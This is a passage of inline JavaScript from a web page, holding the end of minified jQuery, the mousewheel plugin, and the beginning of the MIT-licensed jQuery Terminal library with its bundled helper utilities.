Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){if(s<2)w(-1,z);else throw z}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)ca(g,a[g],c,e);return d.join("&").replace(bD,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cd=f.now(),ce=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cd++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.contentType==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(ce.test(b.url)||e&&ce.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(ce,l),b.url===j&&(e&&(k=k.replace(ce,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var cf=a.ActiveXObject?function(){for(var a in ch)ch[a](0,1)}:!1,cg=0,ch;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ci()||cj()}:ci,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,cf&&delete ch[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cg,cf&&(ch||(ch={},f(a).unload(cf)),ch[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var ck={},cl,cm,cn=/^(?:toggle|show|hide)$/,co=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cp,cq=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cr;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cv(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu("hide",3),a,b,c);var d,e,g=0,h=this.length;for(;g<h;g++)d=this[g],d.style&&(e=f.css(d,"display"),e!=="none"&&!f._data(d,"olddisplay")&&f._data(d,"olddisplay",e));for(g=0;g<h;g++)this[g].style&&(this[g].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cu("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){function g(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(!f.support.inlineBlockNeedsLayout||cv(this.nodeName)==="inline"?this.style.display="inline-block":this.style.zoom=1))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)j=new f.fx(this,b,i),h=a[i],cn.test(h)?(o=f._data(this,"toggle"+i)||(h==="toggle"?d?"show":"hide":0),o?(f._data(this,"toggle"+i,o==="show"?"hide":"show"),j[o]()):j[h]()):(k=co.exec(h),l=j.cur(),k?(m=parseFloat(k[2]),n=k[3]||(f.cssNumber[i]?"":"px"),n!=="px"&&(f.style(this,i,(m||1)+n),l=(m||1)/j.cur()*l,f.style(this,i,l+n)),k[1]&&(m=(k[1]==="-="?-1:1)*m+l),j.custom(l,m,n)):j.custom(l,h,""));return!0}var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return e.queue===!1?this.each(g):this.queue(e.queue,g)},stop:function(a,c,d){typeof a!="string"&&(d=c,c=a,a=b),c&&a!==!1&&this.queue(a||"fx",[]);return this.each(function(){function h(a,b,c){var e=b[c];f.removeData(a,c,!0),e.stop(d)}var b,c=!1,e=f.timers,g=f._data(this);d||f._unmark(!0,this);if(a==null)for(b in g)g[b]&&g[b].stop&&b.indexOf(".run")===b.length-4&&h(this,g,b);else g[b=a+".run"]&&g[b].stop&&h(this,g,b);for(b=e.length;b--;)e[b].elem===this&&(a==null||e[b].queue===a)&&(d?e[b](!0):e[b].saveState(),c=!0,e.splice(b,1));(!d||!c)&&f.dequeue(this,a)})}}),f.each({slideDown:cu("show",1),slideUp:cu("hide",1),slideToggle:cu("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default;if(d.queue==null||d.queue===!0)d.queue="fx";d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&&d.old.call(this),d.queue?f.dequeue(this,d.queue):a!==!1&&f._unmark(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,c,d){function h(a){return e.step(a)}var e=this,g=f.fx;this.startTime=cr||cs(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(f.cssNumber[this.prop]?"":"px"),h.queue=this.options.queue,h.elem=this.elem,h.saveState=function(){e.options.hide&&f._data(e.elem,"fxshow"+e.prop)===b&&f._data(e.elem,"fxshow"+e.prop,e.start)},h()&&f.timers.push(h)&&!cp&&(cp=setInterval(g.tick,g.interval))},show:function(){var a=f._data(this.elem,"fxshow"+this.prop);this.options.orig[this.prop]=a||f.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f._data(this.elem,"fxshow"+this.prop)||f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=cr||cs(),g=!0,h=this.elem,i=this.options;if(a||e>=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;for(b in i.animatedProperties)i.animatedProperties[b]!==!0&&(g=!1);if(g){i.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){h.style["overflow"+b]=i.overflow[a]}),i.hide&&f(h).hide();if(i.hide||i.show)for(b in i.animatedProperties)f.style(h,b,i.orig[b]),f.removeData(h,"fxshow"+b,!0),f.removeData(h,"toggle"+b,!0);d=i.complete,d&&(i.complete=!1,d.call(h))}return!1}i.duration==Infinity?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=f.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){var a,b=f.timers,c=0;for(;c<b.length;c++)a=b[c],!a()&&b[c]===a&&b.splice(c--,1);b.length||f.fx.stop()},interval:13,stop:function(){clearInterval(cp),cp=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),f.each(["width","height"],function(a,b){f.fx.step[b]=function(a){f.style(a.elem,b,Math.max(0,a.now)+a.unit)}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.support.fixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.support.doesNotAddBorder&&(!f.support.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.support.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.support.fixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.support.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){var a=this[0];return a?a.style?parseFloat(f.css(a,d,"padding")):this[d]():null},f.fn["outer"+c]=function(a){var b=this[0];return b?b.style?parseFloat(f.css(b,d,a?"margin":"border")):this[d]():null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c],h=e.document.body;return e.document.compatMode==="CSS1Compat"&&g||h&&h["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var i=f.css(e,d),j=parseFloat(i);return f.isNumeric(j)?j:i}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f,typeof define=="function"&&define.amd&&define.amd.jQuery&&define("jquery",[],function(){return f})})(window);</script>
        <script>(function(c){function g(a){var b=a||window.event,i=[].slice.call(arguments,1),e=0,h=0,f=0;a=c.event.fix(b);a.type="mousewheel";if(b.wheelDelta)e=b.wheelDelta/120;if(b.detail)e=-b.detail/3;f=e;if(b.axis!==undefined&&b.axis===b.HORIZONTAL_AXIS){f=0;h=-1*e}if(b.wheelDeltaY!==undefined)f=b.wheelDeltaY/120;if(b.wheelDeltaX!==undefined)h=-1*b.wheelDeltaX/120;i.unshift(a,e,h,f);return(c.event.dispatch||c.event.handle).apply(this,i)}var d=["DOMMouseScroll","mousewheel"];if(c.event.fixHooks)for(var j=d.length;j;)c.event.fixHooks[d[--j]]=
                c.event.mouseHooks;c.event.special.mousewheel={setup:function(){if(this.addEventListener)for(var a=d.length;a;)this.addEventListener(d[--a],g,false);else this.onmousewheel=g},teardown:function(){if(this.removeEventListener)for(var a=d.length;a;)this.removeEventListener(d[--a],g,false);else this.onmousewheel=null}};c.fn.extend({mousewheel:function(a){return a?this.bind("mousewheel",a):this.trigger("mousewheel")},unmousewheel:function(a){return this.unbind("mousewheel",a)}})})(jQuery);
        </script>
        <script>/**@license
             *       __ _____                     ________                              __
             *      / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /
             *  __ / // // // // // _  // _// // / / // _  // _//     // //  \/ // _ \/ /
             * /  / // // // // // ___// / / // / / // ___// / / / / // // /\  // // / /__
             * \___//____ \\___//____//_/ _\_  / /_//____//_/ /_/ /_//_//_/ /_/ \__\_\___/
             *           \/              /____/                              version 0.11.12
             *
             * This file is part of jQuery Terminal. http://terminal.jcubic.pl
             *
             * Copyright (c) 2010-2016 Jakub Jankiewicz <http://jcubic.pl>
             * Released under the MIT license
             *
             * Contains:
             *
             * Storage plugin Distributed under the MIT License
             * Copyright (c) 2010 Dave Schindler
             *
             * jQuery Timers licenced with the WTFPL
             * <http://jquery.offput.ca/timers/>
             *
             * Cross-Browser Split 1.1.1
             * Copyright 2007-2012 Steven Levithan <stevenlevithan.com>
             * Available under the MIT License
             *
             * jQuery Caret
             * Copyright (c) 2009, Gideon Sireling
             * 3 clause BSD License
             *
             * sprintf.js
             * Copyright (c) 2007-2013 Alexandru Marasteanu <hello at alexei dot ro>
             * licensed under 3 clause BSD license
             *
             * Date: Wed, 02 Nov 2016 20:34:33 +0000
             */
            (function(e){var n=function(){if(!n.cache.hasOwnProperty(arguments[0])){n.cache[arguments[0]]=n.parse(arguments[0])}return n.format.call(null,n.cache[arguments[0]],arguments)};n.format=function(e,r){var o=1,a=e.length,s="",l,f=[],c,u,h,p,m,g;for(c=0;c<a;c++){s=t(e[c]);if(s==="string"){f.push(e[c])}else if(s==="array"){h=e[c];if(h[2]){l=r[o];for(u=0;u<h[2].length;u++){if(!l.hasOwnProperty(h[2][u])){throw n('[sprintf] property "%s" does not exist',h[2][u])}l=l[h[2][u]]}}else if(h[1]){l=r[h[1]]}else{l=r[o++]}if(/[^s]/.test(h[8])&&t(l)!="number"){throw n("[sprintf] expecting number but found %s",t(l))}switch(h[8]){case"b":l=l.toString(2);break;case"c":l=String.fromCharCode(l);break;case"d":l=parseInt(l,10);break;case"e":l=h[7]?l.toExponential(h[7]):l.toExponential();break;case"f":l=h[7]?parseFloat(l).toFixed(h[7]):parseFloat(l);break;case"o":l=l.toString(8);break;case"s":l=(l=String(l))&&h[7]?l.substring(0,h[7]):l;break;case"u":l=l>>>0;break;case"x":l=l.toString(16);break;case"X":l=l.toString(16).toUpperCase();break}l=/[def]/.test(h[8])&&h[3]&&l>=0?"+"+l:l;m=h[4]?h[4]=="0"?"0":h[4].charAt(1):" ";g=h[6]-String(l).length;p=h[6]?i(m,g):"";f.push(h[5]?l+p:p+l)}}return f.join("")};n.cache={};n.parse=function(e){var n=e,r=[],t=[],i=0;while(n){if((r=/^[^\x25]+/.exec(n))!==null){t.push(r[0])}else if((r=/^\x25{2}/.exec(n))!==null){t.push("%")}else if((r=/^\x25(?:([1-9]\d*)\$|\(([^\)]+)\))?(\+)?(0|'[^$])?(-)?(\d+)?(?:\.(\d+))?([b-fosuxX])/.exec(n))!==null){if(r[2]){i|=1;var o=[],a=r[2],s=[];if((s=/^([a-z_][a-z_\d]*)/i.exec(a))!==null){o.push(s[1]);while((a=a.substring(s[0].length))!==""){if((s=/^\.([a-z_][a-z_\d]*)/i.exec(a))!==null){o.push(s[1])}else if((s=/^\[(\d+)\]/.exec(a))!==null){o.push(s[1])}else{throw"[sprintf] huh?"}}}else{throw"[sprintf] huh?"}r[2]=o}else{i|=2}if(i===3){throw"[sprintf] mixing positional and named placeholders is not (yet) supported"}t.push(r)}else{throw"[sprintf] huh?"}n=n.substring(r[0].length)}return t};var r=function(e,r,t){t=r.slice(0);t.splice(0,0,e);return n.apply(null,t)};function t(e){return Object.prototype.toString.call(e).slice(8,-1).toLowerCase()}function i(e,n){for(var r=[];n>0;r[--n]=e){}return r.join("")}e.sprintf=n;e.vsprintf=r})(typeof global!="undefined"?global:window);(function(e,n){"use strict";e.omap=function(n,r){var t={};e.each(n,function(e,i){t[e]=r.call(n,e,i)});return t};var r={clone_object:function(n){var r={};if(typeof n=="object"){if(e.isArray(n)){return this.clone_array(n)}else if(n===null){return n}else{for(var t in n){if(e.isArray(n[t])){r[t]=this.clone_array(n[t])}else if(typeof n[t]=="object"){r[t]=this.clone_object(n[t])}else{r[t]=n[t]}}}}return r},clone_array:function(n){if(!e.isFunction(Array.prototype.map)){throw new Error("You'r browser don't support ES5 array map "+"use es5-shim")}return n.slice(0).map(function(e){if(typeof e=="object"){return this.clone_object(e)}else{return e}}.bind(this))}};var t=function(e){return r.clone_object(e)};var i=function(){var e="test",n=window.localStorage;try{n.setItem(e,"1");n.removeItem(e);return true}catch(r){return false}};var o=i();function a(e,n){var r;if(typeof e==="string"&&typeof n==="string"){localStorage[e]=n;return true}else if(typeof e==="object"&&typeof n==="undefined"){for(r in e){if(e.hasOwnProperty(r)){localStorage[r]=e[r]}}return true}return false}function s(e,n){var r,t,i;r=new Date;r.setTime(r.getTime()+31536e6);t="; expires="+r.toGMTString();if(typeof e==="string"&&typeof n==="string"){document.cookie=e+"="+n+t+"; path=/";return true}else if(typeof e==="object"&&typeof n==="undefined"){for(i in e){if(e.hasOwnProperty(i)){document.cookie=i+"="+e[i]+t+"; path=/"}}return true}return false}function l(e){return localStorage[e]}function f(e){var n,r,t,i;n=e+"=";r=document.cookie.split(";");for(t=0;t<r.length;t++){i=r[t];while(i.charAt(0)===" "){i=i.substring(1,i.length)}if(i.indexOf(n)===0){return i.substring(n.length,i.length)}}return null}function c(e){return delete localStorage[e]}function u(e){return s(e,"",-1)}e.extend({Storage:{set:o?a:s,get:o?l:f,remove:o?c:u}});var h=e;h.fn.extend({everyTime:function(e,n,r,t,i){return this.each(function(){h.timer.add(this,e,n,r,t,i)})},oneTime:function(e,n,r){return this.each(function(){h.timer.add(this,e,n,r,1)})},stopTime:function(e,n){return this.each(function(){h.timer.remove(this,e,n)})}});h.extend({timer:{guid:1,global:{},regex:/^([0-9]+)\s*(.*s)?$/,powers:{ms:1,cs:10,ds:100,s:1e3,das:1e4,hs:1e5,ks:1e6},timeParse:function(e){if(e===n||e===null){return null}var r=this.regex.exec(h.trim(e.toString()));if(r[2]){var t=parseInt(r[1],10);var i=this.powers[r[2]]||1;return t*i}else{return e}},add:function(e,n,r,t,i,o){var a=0;if(h.isFunction(r)){if(!i){i=t}t=r;r=n}n=h.timer.timeParse(n);if(typeof n!=="number"||isNaN(n)||n<=0){return}if(i&&i.constructor!==Number){o=!!i;i=0}i=i||0;o=o||false;if(!e.$timers){e.$timers={}}if(!e.$timers[r]){e.$timers[r]={}}t.$timerID=t.$timerID||this.guid++;var s=function(){if(o&&s.inProgress){return}s.inProgress=true;if(++a>i&&i!==0||t.call(e,a)===false){h.timer.remove(e,r,t)}s.inProgress=false};s.$timerID=t.$timerID;if(!e.$timers[r][t.$timerID]){e.$timers[r][t.$timerID]=window.setInterval(s,n)}if(!this.global[r]){this.global[r]=[]}this.global[r].push(e)},remove:function(e,n,r){var t=e.$timers,i;if(t){if(!n){for(var o in t){if(t.hasOwnProperty(o)){this.remove(e,o,r)}}}else if(t[n]){if(r){if(r.$timerID){window.clearInterval(t[n][r.$timerID]);delete t[n][r.$timerID]}}else{for(var a in t[n]){if(t[n].hasOwnProperty(a)){window.clearInterval(t[n][a]);delete t[n][a]}}}for(i in t[n]){if(t[n].hasOwnProperty(i)){break}}if(!i){i=null;delete t[n]}}for(i in t){if(t.hasOwnProperty(i)){break}}if(!i){e.$timers=null}}}}});if(/(msie) ([\w.]+)/.exec(navigator.userAgent.toLowerCase())){h(window).one("unload",function(){var e=h.timer.global;for(var n in e){if(e.hasOwnProperty(n)){var r=e[n],t=r.length;while(--t){h.timer.remove(r[t],n)}}}})}(function(e){if(!String.prototype.split.toString().match(/\[native/)){return}var n=String.prototype.split,r=/()??/.exec("")[1]===e,t;t=function(t,i,o){if(Object.prototype.toString.call(i)!=="[object RegExp]"){return n.call(t,i,o)}var a=[],s=(i.ignoreCase?"i":"")+(i.multiline?"m":"")+(i.extended?"x":"")+(i.sticky?"y":""),l=0,f,c,u,h;i=new RegExp(i.source,s+"g");t+="";if(!r){f=new RegExp("^"+i.source+"$(?!\\s)",s)}o=o===e?-1>>>0:o>>>0;while(c=i.exec(t)){u=c.index+c[0].length;if(u>l){a.push(t.slice(l,c.index));if(!r&&c.length>1){c[0].replace(f,function(){for(var n=1;n<arguments.length-2;n++){if(arguments[n]===e){c[n]=e}}})}if(c.length>1&&c.index<t.length){Array.prototype.push.apply(a,c.slice(1))}h=c[0].length;l=u;if(a.length>=o){break}}if(i.lastIndex===c.index){i.lastIndex++}}if(l===t.length){if(h||!i.test("")){a.push("")}}else{a.push(t.slice(l))}return a.length>o?a.slice(0,o):a};String.prototype.split=function(e,n){return t(this,e,n)};return t})();e.fn.caret=function(e){var n=this[0];var r=n.contentEditable==="true";if(arguments.length==0){if(window.getSelection){if(r){n.focus();var t=window.getSelection().getRangeAt(0),i=t.cloneRange();i.selectNodeContents(n);i.setEnd(t.endContainer,t.endOffset);return i.toString().length}return n.selectionStart}if(document.selection){n.focus();if(r){var t=document.selection.createRange(),i=document.body.createTextRange();i.moveToElementText(n);i.setEndPoint("EndToEnd",t);return i.text.length}var e=0,o=n.createTextRange(),i=document.selection.createRange().duplicate(),a=i.getBookmark();o.moveToBookmark(a);while(o.moveStart("character",-1)!==0)e++;return e}return 0}if(e==-1)e=this[r?"text":"val"]().length;if(window.getSelection){if(r){n.focus();window.getSelection().collapse(n.firstChild,e)}else n.setSelectionRange(e,e)}else if(document.body.createTextRange){var o=document.body.createTextRange();o.moveToElementText(n);o.moveStart("character",e);o.collapse(true);o.select()}if(!r)n.focus();return e};function p(e,n){var r=[];var t=e.length;if(t<n){return[e]}else if(n<0){throw new Error("str_parts: length can't be negative")}for(var i=0;i<t;i+=n){r.push(e.substring(i,i+n))}return r}function m(n){var r=n?[n]:[];var t=0;e.extend(this,{get:function(){return r},rotate:function(){if(!r.filter(Boolean).length){return}if(r.length===1){return r[0]}else{if(t===r.length-1){t=0}else{++t}if(r[t]){return r[t]}else{return this.rotate()}}},length:function(){return r.length},remove:function(e){delete r[e]},set:function(e){for(var n=r.length;n--;){if(r[n]===e){t=n;return}}this.append(e)},front:function(){if(r.length){var e=t;var n=false;while(!r[e]){e++;if(e>r.length){if(n){break}e=0;n=true}}return r[e]}},append:function(e){r.push(e)}})}function g(n){var r=n instanceof Array?n:n?[n]:[];e.extend(this,{data:function(){return r},map:function(n){return e.map(r,n)},size:function(){return r.length},pop:function(){if(r.length===0){return null}else{var e=r[r.length-1];r=r.slice(0,r.length-1);return e}},push:function(e){r=r.concat([e]);return e},top:function(){return r.length>0?r[r.length-1]:null},clone:function(){return new g(r.slice(0))}})}e.json_stringify=function(r,t){var i="",o;t=t===n?1:t;var a=typeof r;switch(a){case"function":i+=r;break;case"boolean":i+=r?"true":"false";break;case"object":if(r===null){i+="null"}else if(r instanceof Array){i+="[";var s=r.length;for(o=0;o<s-1;++o){i+=e.json_stringify(r[o],t+1)}i+=e.json_stringify(r[s-1],t+1)+"]"}else{i+="{";for(var l in r){if(r.hasOwnProperty(l)){i+='"'+l+'":'+e.json_stringify(r[l],t+1)}}i+="}"}break;case"string":var f=r;var c={"\\\\":"\\\\",'"':'\\"',"/":"\\/","\\n":"\\n","\\r":"\\r","\\t":"\\t"};for(o in c){if(c.hasOwnProperty(o)){f=f.replace(new RegExp(o,"g"),c[o])}}i+='"'+f+'"';break;case"number":i+=String(r);break}i+=t>1?",":"";if(t===1){i=i.replace(/,([\]}])/g,"$1")}return i.replace(/([\[{]),/g,"$1")};function d(n,r){var t=true;var i="";if(typeof n==="string"&&n!==""){i=n+"_"}i+="commands";var o=e.Storage.get(i);o=o?e.parseJSON(o):[];var a=o.length-1;e.extend(this,{append:function(n){if(t){if(o[o.length-1]!==n){o.push(n);if(r&&o.length>r){o=o.slice(-r)}a=o.length-1;e.Storage.set(i,e.json_stringify(o))}}},data:function(){return o},reset:function(){a=o.length-1},last:function(){return o[o.length-1]},end:function(){return a===o.length-1},position:function(){return a},current:function(){return o[a]},next:function(){if(a<o.length-1){++a}if(a!==-1){return o[a]}},previous:function(){var e=a;if(a>0){--a}if(e!==-1){return o[a]}},clear:function(){o=[];this.purge()},enabled:function(){return 